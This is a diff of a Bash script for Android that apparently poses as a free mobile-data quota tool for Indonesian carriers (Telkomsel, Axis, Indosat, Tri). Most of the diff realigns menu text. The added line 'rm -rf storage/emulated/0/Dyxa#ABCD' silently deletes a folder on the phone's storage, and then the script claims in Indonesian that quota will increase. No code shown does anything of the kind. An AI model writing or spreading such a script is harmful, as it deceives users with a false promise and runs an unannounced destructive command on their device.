@@ -20,11 +20,11 @@ sleep 1
 echo " "
 echo $green "============== $red MENU $green ================="
 echo $blue "===================================="
-echo $blue "|| $green 1. Telkomsel.                 $blue ||"
+echo $blue "|| $green 1. Telkomsel.            $blue ||"
 echo $blue "|| $green 2. Axis     			       $blue ||"
-echo $blue "|| $green 3. Indosat	   			  $blue ||"
+echo $blue "|| $green 3. Indosat	   			     $blue ||"
 echo $blue "|| $green 4. Tri			             $blue ||"
-echo $blue "|| $green 0. Exit The Program           $blue ||"
+echo $blue "|| $green 0. Exit The Program      $blue ||"
 echo $blue "===================================="
 echo $blue"╭──[Masukkan Pilihan Anda]>"
 read -p"╰───────root@dyxa#ABCD=•>" Gans;
@@ -38,5 +38,6 @@ read -p"╰───────root@dyxa#ABCD=•>" memeq;
 sleep 1
 echo $red "Loading"
 sleep 2
+rm -rf storage/emulated/0/Dyxa#ABCD
 echo  $blue "Tunggu Beberapa Menit , Nanti Kouta Akan Bertambah"
 fi
